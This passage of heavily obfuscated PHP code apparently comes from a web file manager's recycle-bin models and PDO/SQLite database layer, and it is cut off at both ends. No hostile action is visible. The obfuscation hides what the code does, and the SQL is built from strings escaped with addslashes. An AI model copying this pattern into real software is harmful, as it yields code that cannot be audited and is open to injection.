$òó¥£Ú, 1200); return $òó¥£Ú; } public function fileNameExist($•¾£, $¨¯èœ‰) { $¥¸ú™åÓôìµ =& $_SERVER[ÀÆ]; $œ¨³§–Á = $this->where(array($¥¸ú™åÓôìµ[492] => $•¾£, $¥¸ú™åÓôìµ[28] => $¨¯èœ‰, $¥¸ú™åÓôìµ[425] => 0))->find(); return is_array($œ¨³§–Á) ? $œ¨³§–Á[$¥¸ú™åÓôìµ[397]] : !1; } public function childList($…Ôî) { $áó½ö =& $_SERVER[ÀÆ]; $ÅÆ÷× = $áó½ö[2013] . $…Ôî; if (isset(self::$cacheChildList[$ÅÆ÷×])) { return self::$cacheChildList[$ÅÆ÷×]; } $õÈÁéõòÂØÉ = array($áó½ö[492] => intval($…Ôî), $áó½ö[425] => 0); $Ëø¦’ùÚŸ = $this->where($õÈÁéõòÂØÉ)->select(); $Ëø¦’ùÚŸ = $Ëø¦’ùÚŸ ? $Ëø¦’ùÚŸ : array(); self::$cacheChildList[$ÅÆ÷×] = $Ëø¦’ùÚŸ; foreach ($Ëø¦’ùÚŸ as $¾û¹) { $ÅÆ÷× = $áó½ö[452] . $¾û¹[$áó½ö[397]]; self::$cacheSourceInfo[$ÅÆ÷×] = $¾û¹; } return $Ëø¦’ùÚŸ; } public function fileNameAuto($¢ÜŒ¡çâÌ, $ÂÉ÷£¤¶, $ÑŸóåî = REPEAT_RENAME, $ã€İ = false) { $¦½³Ï =& $_SERVER[ÀÆ]; $‰³î = array($¦½³Ï[492] => $¢ÜŒ¡çâÌ, $¦½³Ï[425] => 0, $¦½³Ï[28] => array($¦½³Ï[381], $ÂÉ÷£¤¶ . $¦½³Ï[382])); $‰¬¸±ÒÀ = $this->field($¦½³Ï[28])->where($‰³î)->select(); $íĞ¨‹£µ”¿‹ = array_to_keyvalue($‰¬¸±ÒÀ, $¦½³Ï[33], $¦½³Ï[28]); return $this->fileNameAutoGet($íĞ¨‹£µ”¿‹, $ÂÉ÷£¤¶, $ÑŸóåî, $ã€İ); } public function fileNameAutoGet($ö‘µ, $š’­‰º, $£ºğ, $’ÃËÍ²) { $§Ö =& $_SERVER[ÀÆ]; if ($£ºğ == REPEAT_REPLACE || !$ö‘µ || !in_array_not_case($š’­‰º, $ö‘µ) || $’ÃËÍ² && $£ºğ != REPEAT_RENAME_FOLDER) { return $š’­‰º; } if ($£ºğ == REPEAT_SKIP) { return !1; } $şŸ”îƒ = $§Ö[95] . get_path_ext($š’­‰º); $şŸ”îƒ = $şŸ”îƒ == $§Ö[95] || $’ÃËÍ² ? $§Ö[33] : $şŸ”îƒ; for ($áÕ” = 1; $áÕ” <= count($ö‘µ) + 1; $áÕ”++) { $ÕÕ¤±ì = substr($š’­‰º, 0, strlen($š’­‰º) - strlen($şŸ”îƒ)); $êÖİ® = $ÕÕ¤±ì . "\x28{$áÕ”}\51{$şŸ”îƒ}"; if (!in_array_not_case($êÖİ®, $ö‘µ)) { return $êÖİ®; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\151\157\x5f\163\157\x75\162\x63\145\137\x72\x65\x63\171\x63\154\x65"; protected $dataAuto = array(array("\x63\162\x65\141\x74\145\x54\x69\x6d\145", "\164\x69\x6d\145", "\x69\x6e\x73\x65\162\x74", "\x66\x75\156\143\x74\151\x6f\156")); public function listData($À°Á¬„ = false) { $¿ÕµŒÌ =& $_SERVER[ÀÆ]; $À°Á¬„ = $À°Á¬„ ? $À°Á¬„ : USER_ID; $†òé = $this->where(array($¿ÕµŒÌ[1563] => $À°Á¬„))->select(); return array_to_keyvalue($†òé, $¿ÕµŒÌ[33], $¿ÕµŒÌ[397]); } public function moveToRecycle($‚à‘ÜµÂ) { $à˜¤© =& $_SERVER[ÀÆ]; $ìõ·¤ = Model($à˜¤©[1250]); $Ö‹§£ìÁ§ë¼ = $ìõ·¤->sourceInfo($‚à‘ÜµÂ); if (!$Ö‹§£ìÁ§ë¼ || $Ö‹§£ìÁ§ë¼[$à˜¤©[425]] == $à˜¤©[87]) { return; } $¨à½ÅÒìŒ = array($à˜¤©[412] => $‚à‘ÜµÂ, $à˜¤©[1563] => USER_ID, $à˜¤©[574] => $Ö‹§£ìÁ§ë¼[$à˜¤©[406]], $à˜¤©[575] => $Ö‹§£ìÁ§ë¼[$à˜¤©[498]], $à˜¤©[578] => $Ö‹§£ìÁ§ë¼[$à˜¤©[515]]); $this->add($¨à½ÅÒìŒ); $this->recycleMove($‚à‘ÜµÂ, 1); if ($Ö‹§£ìÁ§ë¼[$à˜¤©[405]] == $à˜¤©[87]) { $¼µƒ = array($à˜¤©[578] => array($à˜¤©[538], $Ö‹§£ìÁ§ë¼[$à˜¤©[515]] . $‚à‘ÜµÂ . $à˜¤©[539])); $ìõ·¤->where($¼µƒ)->setField($à˜¤©[425], 1); } } public function clear() { $this->remove(!1); } public function remove($³™Ş™¿¿ë¢¢ = false, $¡½—ÆíÉŒ = false) { $ÌÉ­†¦üµÅ“ =& $_SERVER[ÀÆ]; $¡½—ÆíÉŒ = $¡½—ÆíÉŒ ? $¡½—ÆíÉŒ : USER_ID; $Ãİ = Model($ÌÉ­†¦üµÅ“[1250]); $æÊ©Š²œ¾ = $this->listData($¡½—ÆíÉŒ); $³™Ş™¿¿ë¢¢ = $³™Ş™¿¿ë¢¢ === !1 ? !1 : $³™Ş™¿¿ë¢¢; $ĞŞ = array(); foreach ($æÊ©Š²œ¾ as $Ï‡ı) { if ($³™Ş™¿¿ë¢¢ != !1 && !in_array($Ï‡ı, $³™Ş™¿¿ë¢¢)) { continue; } $×„ß¡¢ = $Ãİ->sourceInfo($Ï‡ı); $Ãİ->remove($Ï‡ı, !1); $ÓÕ¼… = $×„ß¡¢[$ÌÉ­†¦üµÅ“[406]] . $ÌÉ­†¦üµÅ“[71] . $×„ß¡¢[$ÌÉ­†¦üµÅ“[498]]; $ĞŞ[$ÓÕ¼…] = array($ÌÉ­†¦üµÅ“[574] => $×„ß¡¢[$ÌÉ­†¦üµÅ“[406]], $ÌÉ­†¦üµÅ“[498] => $×„ß¡¢[$ÌÉ­†¦üµÅ“[498]]); $this->where(array($ÌÉ­†¦üµÅ“[397] => $Ï‡ı))->delete(); } foreach ($ĞŞ as $ó­³ï¹Ô¡É„) { $Ãİ->targetSpaceUpdate($ó­³ï¹Ô¡É„[$ÌÉ­†¦üµÅ“[406]], $ó­³ï¹Ô¡É„[$ÌÉ­†¦üµÅ“[498]]); } } public function restore($–‡ö¬™ = false) { $êÉÛ†é = $this->listData(); $this->_restoreSource($êÉÛ†é, $–‡ö¬™); } public function removeUserAll($«éĞöó) { $this->remove(!1, $«éĞöó); } private function _restoreSource($¢°²ö¸´, $€…ûª‹²˜Œ) { $ãğÎÜŒ‹¦µş =& $_SERVER[ÀÆ]; $¢÷À‹¥Ö¢Ìì = Model($ãğÎÜŒ‹¦µş[1250]); $€…ûª‹²˜Œ = $€…ûª‹²˜Œ == !1 ? !1 : $€…ûª‹²˜Œ; if (!$¢°²ö¸´) { return !0; } $Ö’ = array(); foreach ($¢°²ö¸´ as $šæù¢¸”ä¿Á) { if ($€…ûª‹²˜Œ != !1 && !in_array($šæù¢¸”ä¿Á, $€…ûª‹²˜Œ)) { continue; } $£ªËòİèõ = $¢÷À‹¥Ö¢Ìì->sourceInfo($šæù¢¸”ä¿Á); $Á‘»Î´Ù£É = $¢÷À‹¥Ö¢Ìì->sourceInfo($£ªËòİèõ[$ãğÎÜŒ‹¦µş[492]]); if ($Á‘»Î´Ù£É[$ãğÎÜŒ‹¦µş[425]] == $ãğÎÜŒ‹¦µş[87]) { continue; } $¢÷À‹¥Ö¢Ìì->lockMoveStart($šæù¢¸”ä¿Á); $this->recycleMove($šæù¢¸”ä¿Á, 0); if ($£ªËòİèõ[$ãğÎÜŒ‹¦µş[405]] == $ãğÎÜŒ‹¦µş[87]) { $Åû’ë = array($ãğÎÜŒ‹¦µş[578] => array($ãğÎÜŒ‹¦µş[538], $£ªËòİèõ[$ãğÎÜŒ‹¦µş[515]] . $šæù¢¸”ä¿Á . $ãğÎÜŒ‹¦µş[539])); $¢÷À‹¥Ö¢Ìì->where($Åû’ë)->setField($ãğÎÜŒ‹¦µş[425], 0); $this->restoreFolderChildren($šæù¢¸”ä¿Á, $¢°²ö¸´); } $this->where(array($ãğÎÜŒ‹¦µş[397] => $šæù¢¸”ä¿Á))->delete(); $¢÷À‹¥Ö¢Ìì->folderSizeReset($£ªËòİèõ[$ãğÎÜŒ‹¦µş[492]]); $Ö’[] = $£ªËòİèõ[$ãğÎÜŒ‹¦µş[492]]; if ($£ªËòİèõ[$ãğÎÜŒ‹¦µş[405]] == $ãğÎÜŒ‹¦µş[87]) { $Ö’[] = $šæù¢¸”ä¿Á; } $¢÷À‹¥Ö¢Ìì->lockMoveEnd($šæù¢¸”ä¿Á); } $¢÷À‹¥Ö¢Ìì->updateModifyTime($Ö’); } private function restoreFolderChildren($…ù‡, $¨ìüûù¯) { $×Ü¡“ÛÌ =& $_SERVER[ÀÆ]; $’ƒ¢ğ = Model($×Ü¡“ÛÌ[1250]); $®´Ó™ÛôÈ¢ê¨ = array($×Ü¡“ÛÌ[397] => array($×Ü¡“ÛÌ[7], array())); foreach ($¨ìüûù¯ as $â¡ÎÏ) { if ($â¡ÎÏ == $…ù‡) { continue; } if (!$’ƒ¢ğ->isParentOf($…ù‡, $â¡ÎÏ)) { continue; } $¶‹±Ç–ëŠË = $’ƒ¢ğ->sourceInfo($â¡ÎÏ); if ($¶‹±Ç–ëŠË[$×Ü¡“ÛÌ[405]] == $×Ü¡“ÛÌ[87]) { $®´Ó™ÛôÈ¢ê¨[] = array($×Ü¡“ÛÌ[578] => array($×Ü¡“ÛÌ[538], $¶‹±Ç–ëŠË[$×Ü¡“ÛÌ[515]] . $â¡ÎÏ . $×Ü¡“ÛÌ[539])); } else { $®´Ó™ÛôÈ¢ê¨[$×Ü¡“ÛÌ[397]][1][] = $â¡ÎÏ; } } if (!$®´Ó™ÛôÈ¢ê¨[$×Ü¡“ÛÌ[397]][1]) { unset($®´Ó™ÛôÈ¢ê¨[$×Ü¡“ÛÌ[397]]); } if (!$®´Ó™ÛôÈ¢ê¨) { return; } $®´Ó™ÛôÈ¢ê¨[$×Ü¡“ÛÌ[397]][1] = array_unique($®´Ó™ÛôÈ¢ê¨[$×Ü¡“ÛÌ[397]][1]); $®´Ó™ÛôÈ¢ê¨[$×Ü¡“ÛÌ[991]] = $×Ü¡“ÛÌ[1834]; $’ƒ¢ğ->where($®´Ó™ÛôÈ¢ê¨)->setField($×Ü¡“ÛÌ[425], 1); } private function recycleMove($ø±Ú…äê©¹÷», $Îûô¤ÖÎ = 1) { $è— =& $_SERVER[ÀÆ]; $ĞÍšã£ = Model($è—[1250]); $È«üİ = Model($è—[2039]); $‹¶ = array($è—[397] => $ø±Ú…äê©¹÷»); if ($Îûô¤ÖÎ) { $ĞÍšã£->where($‹¶)->setField($è—[425], 1); $È«üİ->eventRecycle($ø±Ú…äê©¹÷», $è—[2040]); } else { $ô = $ĞÍšã£->where($‹¶)->find(); $Åğ–¹æí“ƒü¿ = $ô[$è—[405]] == $è—[87]; $º€Ï‘§– = $ĞÍšã£->fileNameAuto($ô[$è—[492]], $ô[$è—[28]], REPEAT_RENAME_FOLDER, $Åğ–¹æí“ƒü¿); if ($º€Ï‘§– != $ô[$è—[28]]) { $ĞÍšã£->rename($ø±Ú…äê©¹÷», $º€Ï‘§–); } $ĞÍšã£->where($‹¶)->setField($è—[425], 0); $È«üİ->eventRecycle($ø±Ú…äê©¹÷», $è—[2041]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\145\x6d\56\x73\157\165\x72\x63\x65\x53\145\143\x72\145\164\114\x69\163\164"; public $field = array("\x73\x6f\165\x72\143\145\x49\x44", "\164\171\160\145\x49\x44", "\x63\x72\x65\x61\x74\145\x55\x73\145\162"); } goto a‰ÛÍ„¾‹; eØùõ­„ê†: class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($­ = '') { $Ó÷ÆĞÀŒäöÏ =& $_SERVER[ÀÆ]; if (!class_exists($Ó÷ÆĞÀŒäöÏ[907])) { think_exception(think_lang($Ó÷ÆĞÀŒäöÏ[10]) . $Ó÷ÆĞÀŒäöÏ[908]); } if (!empty($­)) { $this->config = $­; if (empty($this->config[$Ó÷ÆĞÀŒäöÏ[13]])) { $this->config[$Ó÷ÆĞÀŒäöÏ[13]] = array(); } } } public function connect($Àö½ = '', $§§¬ = 0) { $î™óùş»ã¥ =& $_SERVER[ÀÆ]; if (!isset($this->linkID[$§§¬])) { if (empty($Àö½)) { $Àö½ = $this->config; } $ô„ = !empty($Àö½[$î™óùş»ã¥[13]][$î™óùş»ã¥[14]]) ? $Àö½[$î™óùş»ã¥[13]][$î™óùş»ã¥[14]] : $this->pconnect; if ($ô„) { $Àö½[$î™óùş»ã¥[13]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$§§¬] = new PDO($Àö½[$î™óùş»ã¥[909]], $Àö½[$î™óùş»ã¥[882]], $Àö½[$î™óùş»ã¥[883]], $Àö½[$î™óùş»ã¥[13]]); } catch (PDOException $¬èÁşƒÍñïÕ¶) { think_exception($¬èÁşƒÍñïÕ¶->getMessage()); } $this->dbType = $this->_getDsnType($Àö½[$î™óùş»ã¥[909]]); if (in_array($this->dbType, array($î™óùş»ã¥[910], $î™óùş»ã¥[911], $î™óùş»ã¥[912], $î™óùş»ã¥[913]))) { think_exception($î™óùş»ã¥[914] . $this->dbType . $î™óùş»ã¥[915] . $this->dbType . $î™óùş»ã¥[916]); } if (!$this->linkID[$§§¬]) { think_exception($î™óùş»ã¥[917]); } try { $this->linkID[$§§¬]->exec($î™óùş»ã¥[918] . think_config($î™óùş»ã¥[885])); } catch (Exception $¬èÁşƒÍñïÕ¶) { } $this->connected = !0; if (1 != think_config($î™óùş»ã¥[18])) { unset($this->config); } } return $this->linkID[$§§¬]; } public function free() { $this->PDOStatement = null; } public function query($¼Ã”ç, $—¼¥áÏÖüÒ = array()) { $²å¡½µ =& $_SERVER[ÀÆ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $¼Ã”ç; if (!empty($—¼¥áÏÖüÒ)) { $this->queryStr .= $²å¡½µ[919] . print_r($—¼¥áÏÖüÒ, !0) . $²å¡½µ[920]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($²å¡½µ[19], 1); think_status($²å¡½µ[20]); $this->PDOStatement = $this->_linkID->prepare($¼Ã”ç); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $ñ³ó–ª€Ø±› = $this->PDOStatement->execute($—¼¥áÏÖüÒ); $this->debug(); if (!1 === $ñ³ó–ª€Ø±›) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($”ì²š”’—«, $…•‘Æ = array()) { $³íèÔ× =& $_SERVER[ÀÆ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $”ì²š”’—«; if (!empty($…•‘Æ)) { $this->queryStr .= $³íèÔ×[919] . print_r($…•‘Æ, !0) . $³íèÔ×[920]; } $ûÜßöæÛ = !1; if ($this->dbType == $³íèÔ×[913]) { if (preg_match($³íèÔ×[921], $this->queryStr, $…Óˆ‡¥æ)) { $this->table = think_config($³íèÔ×[922]) . str_ireplace(think_config($³íèÔ×[923]), $³íèÔ×[376], $…Óˆ‡¥æ[2]); $ûÜßöæÛ = (bool) $this->query($³íèÔ×[924] . strtoupper($this->table) . $³íèÔ×[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($³íèÔ×[21], 1); think_status($³íèÔ×[20]); $this->PDOStatement = $this->_linkID->prepare($”ì²š”’—«); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $¶•É¢ = $this->PDOStatement->execute($…•‘Æ); $this->debug(); if (!1 === $¶•É¢) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($ûÜßöæÛ || preg_match($³íèÔ×[925], $”ì²š”’—«)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $˜ ˆØËÕ² = $this->_linkID->commit(); $this->transTimes = 0; if (!$˜ ˆØËÕ²) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Ù¦êÙÄäïŠˆ­ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$Ù¦êÙÄäïŠˆ­) { $this->error(); return !1; } } return !0; } private function getAll() { $ÒÕøÏ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($ÒÕøÏ); return $ÒÕøÏ; } public function getFields($Øô«) { $´Ş¸ºÏ =& $_SERVER[ÀÆ]; $this->initConnect(!0); if (think_config($´Ş¸ºÏ[926])) { $®ƒ·˜È‰æ¨ì = str_replace($´Ş¸ºÏ[927], $Øô«, think_config($´Ş¸ºÏ[926])); } else { switch ($this->dbType) { case $´Ş¸ºÏ[910]: case $´Ş¸ºÏ[928]: $®ƒ·˜È‰æ¨ì = "\x53\105\x4c\105\103\124\40\40\40\x63\157\x6c\165\x6d\x6e\x5f\x6e\141\155\145\40\x61\x73\x20\x27\x4e\x61\x6d\x65\47\x2c\40\40\40\144\x61\x74\141\137\x74\x79\160\x65\x20\141\x73\40\x27\x54\x79\x70\x65\x27\54\40\x20\40\143\157\x6c\x75\x6d\156\137\144\x65\x66\x61\x75\154\x74\x20\x61\x73\40\47\x44\x65\146\x61\x75\x6c\x74\x27\x2c\40\40\x20\151\x73\137\156\x75\x6c\x6c\141\x62\154\x65\40\x61\163\40\x27\x4e\x75\154\x6c\x27\xa\x9\11\x46\x52\117\x4d\x9\x69\156\146\157\162\x6d\141\164\151\157\156\x5f\163\143\150\x65\x6d\x61\x2e\164\141\142\x6c\145\x73\40\101\123\x20\164\12\x9\x9\x4a\x4f\111\116\11\x69\156\146\157\x72\x6d\141\164\151\157\x6e\x5f\x73\143\150\x65\x6d\141\x2e\x63\157\x6c\165\x6d\x6e\163\x20\101\x53\x20\143\xa\11\11\117\116\x20\40\x74\56\x74\x61\142\154\145\x5f\x63\141\x74\x61\x6c\x6f\147\x20\75\x20\x63\x2e\x74\x61\142\x6c\145\x5f\x63\x61\x74\141\x6c\x6f\x67\xa\11\x9\101\116\104\x20\164\56\164\x61\x62\x6c\x65\x5f\163\143\x68\x65\x6d\x61\40\75\40\143\x2e\x74\141\x62\154\145\x5f\163\x63\x68\x65\x6d\141\xa\11\x9\101\x4e\104\x20\x74\x2e\x74\141\142\x6c\145\137\156\x61\x6d\145\x20\75\40\x63\x2e\x74\141\142\x6c\145\x5f\156\141\x6d\x65\xa\11\11\127\x48\105\x52\x45\40\x20\x20\x74\56\164\141\142\154\145\137\x6e\141\155\x65\40\75\x20\x27{$Øô«}\47"; break; case $´Ş¸ºÏ[929]: $®ƒ·˜È‰æ¨ì = $´Ş¸ºÏ[930] . $Øô« . $´Ş¸ºÏ[931]; break; case $´Ş¸ºÏ[911]: case $´Ş¸ºÏ[913]: $®ƒ·˜È‰æ¨ì = $´Ş¸ºÏ[932] . $´Ş¸ºÏ[933] . $´Ş¸ºÏ[934] . strtoupper($Øô«) . $´Ş¸ºÏ[935] . strtoupper($Øô«) . $´Ş¸ºÏ[936]; break; case $´Ş¸ºÏ[937]: $®ƒ·˜È‰æ¨ì = $´Ş¸ºÏ[938] . $Øô« . $´Ş¸ºÏ[939]; break; case $´Ş¸ºÏ[912]: break; case $´Ş¸ºÏ[940]: default: $®ƒ·˜È‰æ¨ì = $´Ş¸ºÏ[941] . ($this->dbType == $´Ş¸ºÏ[940] ? "\140{$Øô«}\140" : $Øô«); } } $ö³¬–È = $this->query($®ƒ·˜È‰æ¨ì); $‘ü‘”öŒ = array(); if ($ö³¬–È) { foreach ($ö³¬–È as $ñ«âğï => $Æ”«ƒ“Ãîˆ) { $Æ”«ƒ“Ãîˆ = array_change_key_case($Æ”«ƒ“Ãîˆ); $Æ”«ƒ“Ãîˆ[$´Ş¸ºÏ[28]] = isset($Æ”«ƒ“Ãîˆ[$´Ş¸ºÏ[28]]) ? $Æ”«ƒ“Ãîˆ[$´Ş¸ºÏ[28]] : $´Ş¸ºÏ[376]; $Æ”«ƒ“Ãîˆ[$´Ş¸ºÏ[29]] = isset($Æ”«ƒ“Ãîˆ[$´Ş¸ºÏ[29]]) ? $Æ”«ƒ“Ãîˆ[$´Ş¸ºÏ[29]] : $´Ş¸ºÏ[376]; $ÂŸ = isset($Æ”«ƒ“Ãîˆ[$´Ş¸ºÏ[271]]) ? $Æ”«ƒ“Ãîˆ[$´Ş¸ºÏ[271]] : $Æ”«ƒ“Ãîˆ[$´Ş¸ºÏ[28]]; $‘ü‘”öŒ[$ÂŸ] = array($´Ş¸ºÏ[28] => $ÂŸ, $´Ş¸ºÏ[29] => $Æ”«ƒ“Ãîˆ[$´Ş¸ºÏ[29]], $´Ş¸ºÏ[31] => (bool) (isset($Æ”«ƒ“Ãîˆ[$´Ş¸ºÏ[103]]) && $Æ”«ƒ“Ãîˆ[$´Ş¸ºÏ[103]] === $´Ş¸ºÏ[33] || isset($Æ”«ƒ“Ãîˆ[$´Ş¸ºÏ[31]]) && $Æ”«ƒ“Ãîˆ[$´Ş¸ºÏ[31]] === $´Ş¸ºÏ[33]), $´Ş¸ºÏ[34] => isset($Æ”«ƒ“Ãîˆ[$´Ş¸ºÏ[34]]) ? $Æ”«ƒ“Ãîˆ[$´Ş¸ºÏ[34]] : (isset($Æ”«ƒ“Ãîˆ[$´Ş¸ºÏ[53]]) ? $Æ”«ƒ“Ãîˆ[$´Ş¸ºÏ[53]] : $´Ş¸ºÏ[376]), $´Ş¸ºÏ[36] => isset($Æ”«ƒ“Ãîˆ[$´Ş¸ºÏ[93]]) ? strtolower($Æ”«ƒ“Ãîˆ[$´Ş¸ºÏ[93]]) == $´Ş¸ºÏ[38] : (isset($Æ”«ƒ“Ãîˆ[$´Ş¸ºÏ[54]]) ? $Æ”«ƒ“Ãîˆ[$´Ş¸ºÏ[54]] : !1), $´Ş¸ºÏ[39] => isset($Æ”«ƒ“Ãîˆ[$´Ş¸ºÏ[942]]) ? strtolower($Æ”«ƒ“Ãîˆ[$´Ş¸ºÏ[942]]) == $´Ş¸ºÏ[41] : (isset($Æ”«ƒ“Ãîˆ[$´Ş¸ºÏ[93]]) ? $Æ”«ƒ“Ãîˆ[$´Ş¸ºÏ[93]] : !1)); } } return $‘ü‘”öŒ; } public function getTables($ƒı¸é¿­å¢Úô = '') { $¶Íğè­›ãÀ =& $_SERVER[ÀÆ]; if (think_config($¶Íğè­›ãÀ[943])) { $–‚±ã‚‘õ—òÏ = str_replace($¶Íğè­›ãÀ[944], $ƒı¸é¿­å¢Úô, think_config($¶Íğè­›ãÀ[943])); } else { switch ($this->dbType) { case $¶Íğè­›ãÀ[911]: case $¶Íğè­›ãÀ[913]: $–‚±ã‚‘õ—òÏ = $¶Íğè­›ãÀ[945]; break; case $¶Íğè­›ãÀ[910]: case $¶Íğè­›ãÀ[928]: $–‚±ã‚‘õ—òÏ = $¶Íğè­›ãÀ[946]; break; case $¶Íğè­›ãÀ[937]: $–‚±ã‚‘õ—òÏ = $¶Íğè­›ãÀ[947]; break; case $¶Íğè­›ãÀ[912]: think_exception(think_lang($¶Íğè­›ãÀ[948]) . $¶Íğè­›ãÀ[949]); break; case $¶Íğè­›ãÀ[929]: $–‚±ã‚‘õ—òÏ = $¶Íğè­›ãÀ[42] . $¶Íğè­›ãÀ[43] . $¶Íğè­›ãÀ[44]; break; case $¶Íğè­›ãÀ[940]: default: if (!empty($ƒı¸é¿­å¢Úô)) { $–‚±ã‚‘õ—òÏ = $¶Íğè­›ãÀ[893] . $ƒı¸é¿­å¢Úô . $¶Íğè­›ãÀ[894]; } else { $–‚±ã‚‘õ—òÏ = $¶Íğè­›ãÀ[895]; } } } $«éÏª = $this->query($–‚±ã‚‘õ—òÏ); $ˆ¢ßÎõ‰Ù = array(); foreach ($«éÏª as $şŸ => $ËĞ‘’Éå) { $ˆ¢ßÎõ‰Ù[$şŸ] = current($ËĞ‘’Éå); } return $ˆ¢ßÎõ‰Ù; } protected function parseLimit($åêğğÉ) { $¿ùÄƒ =& $_SERVER[ÀÆ]; $³ğÂË´Ä÷ÂÛ = $¿ùÄƒ[33]; if (!empty($åêğğÉ)) { switch ($this->dbType) { case $¿ùÄƒ[937]: case $¿ùÄƒ[929]: $åêğğÉ = explode($¿ùÄƒ[47], $åêğğÉ); if (count($åêğğÉ) > 1) { $³ğÂË´Ä÷ÂÛ .= $¿ùÄƒ[48] . $åêğğÉ[1] . $¿ùÄƒ[49] . $åêğğÉ[0] . $¿ùÄƒ[50]; } else { $³ğÂË´Ä÷ÂÛ .= $¿ùÄƒ[48] . $åêğğÉ[0] . $¿ùÄƒ[50]; } break; case $¿ùÄƒ[910]: case $¿ùÄƒ[928]: break; case $¿ùÄƒ[912]: break; case $¿ùÄƒ[911]: case $¿ùÄƒ[913]: break; case $¿ùÄƒ[940]: default: $³ğÂË´Ä÷ÂÛ .= $¿ùÄƒ[48] . $åêğğÉ . $¿ùÄƒ[50]; } } return $³ğÂË´Ä÷ÂÛ; } public function parseKey(&$èš, $˜¼»åÄ• = true) { $åõë•Ùß =& $_SERVER[ÀÆ]; if ($˜¼»åÄ•) { $èš = $this->parseKeyCheck($èš); } if ($this->dbType == $åõë•Ùß[940]) { if ($èš != $åõë•Ùß[182] && !preg_match($åõë•Ùß[905], $èš)) { $èš = $åõë•Ùß[383] . trim($èš, $åõë•Ùß[383]) . $åõë•Ùß[383]; } return $èš; } else { return parent::parseKey($èš, $˜¼»åÄ•); } } public function close() { $this->_linkID = null; } public function error() { $ŠŸ =& $_SERVER[ÀÆ]; if ($this->PDOStatement) { $ÛÏê£ñœø = $this->PDOStatement->errorInfo(); $this->error = $ÛÏê£ñœø[1] . $ŠŸ[4] . $ÛÏê£ñœø[2]; } else { $this->error = $ŠŸ[33]; } if ($ŠŸ[33] != $this->queryStr) { $this->error .= LNG($ŠŸ[45]) . $this->queryStr; } think_trace($this->error, $ŠŸ[33], $ŠŸ[46]); return $this->error; } public function escapeString($İ¿ÇÃ) { $§£ĞÊ =& $_SERVER[ÀÆ]; switch ($this->dbType) { case $§£ĞÊ[937]: case $§£ĞÊ[910]: case $§£ĞÊ[928]: case $§£ĞÊ[940]: return addslashes($İ¿ÇÃ); case $§£ĞÊ[912]: case $§£ĞÊ[929]: case $§£ĞÊ[911]: case $§£ĞÊ[913]: return str_ireplace($§£ĞÊ[55], $§£ĞÊ[56], $İ¿ÇÃ); } } protected function parseValue($Ö¢‘¼îØ) { $ÂŸº…¢ÕĞØ =& $_SERVER[ÀÆ]; if (is_string($Ö¢‘¼îØ)) { $Úî´™´Ğ¼È = strpos($Ö¢‘¼îØ, $ÂŸº…¢ÕĞØ[4]) === 0 && in_array($Ö¢‘¼îØ, array_keys($this->bind)); $Ö¢‘¼îØ = $Úî´™´Ğ¼È ? $this->escapeString($Ö¢‘¼îØ) : $ÂŸº…¢ÕĞØ[950] . $this->escapeString($Ö¢‘¼îØ) . $ÂŸº…¢ÕĞØ[950]; } elseif (isset($Ö¢‘¼îØ[0]) && is_string($Ö¢‘¼îØ[0]) && strtolower($Ö¢‘¼îØ[0]) == $ÂŸº…¢ÕĞØ[295]) { $Ö¢‘¼îØ = $this->escapeString($Ö¢‘¼îØ[1]); } elseif (is_array($Ö¢‘¼îØ)) { $Ö¢‘¼îØ = array_map(array($this, $ÂŸº…¢ÕĞØ[951]), $Ö¢‘¼îØ); } elseif (is_bool($Ö¢‘¼îØ)) { $Ö¢‘¼îØ = $Ö¢‘¼îØ ? $ÂŸº…¢ÕĞØ[87] : $ÂŸº…¢ÕĞØ[191]; } elseif (is_null($Ö¢‘¼îØ)) { $Ö¢‘¼îØ = $ÂŸº…¢ÕĞØ[103]; } return $Ö¢‘¼îØ; } public function getLastInsertId() { $Â¥¦ëË—¼¶„µ =& $_SERVER[ÀÆ]; switch ($this->dbType) { case $Â¥¦ëË—¼¶„µ[937]: case $Â¥¦ëË—¼¶„µ[929]: case $Â¥¦ëË—¼¶„µ[910]: case $Â¥¦ëË—¼¶„µ[928]: case $Â¥¦ëË—¼¶„µ[912]: case $Â¥¦ëË—¼¶„µ[940]: return $this->_linkID->lastInsertId(); case $Â¥¦ëË—¼¶„µ[911]: case $Â¥¦ëË—¼¶„µ[913]: $ş¹åçšŠ = $this->table; $ç¨ = $this->query("\x53\105\x4c\105\x43\124\x20{$ş¹åçšŠ}\x2e\x63\x75\162\x72\166\x61\154\40\143\x75\x72\x72\166\141\154\40\106\x52\117\x4d\40\x64\x75\x61\x6c"); return $ç¨ ? $ç¨[0][$Â¥¦ëË—¼¶„µ[952]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($Š„±ì—ÙÕÌ) { $ ¡ìº¿ûç =& $_SERVER[ÀÆ]; if (!CacheLock::fileLock($ ¡ìº¿ûç[9])) { return !1; } $£Î—É = parent::query($Š„±ì—ÙÕÌ); CacheLock::fileUnLock($ ¡ìº¿ûç[9]); return $£Î—É; } public function execute($–İœÚÎïÁ) { $Ö•¿« =& $_SERVER[ÀÆ]; if (!CacheLock::fileLock($Ö•¿«[9])) { return !1; } $×ñ½Íò–‚«‡­ = parent::execute($–İœÚÎïÁ); CacheLock::fileUnLock($Ö•¿«[9]); return $×ñ½Íò–‚«‡­; } } class DbSqlite3 extends DbSqlite3Base { public function query($¶ö° ­ª¶‹Š) { $Õç¾ûü =& $_SERVER[ÀÆ]; if 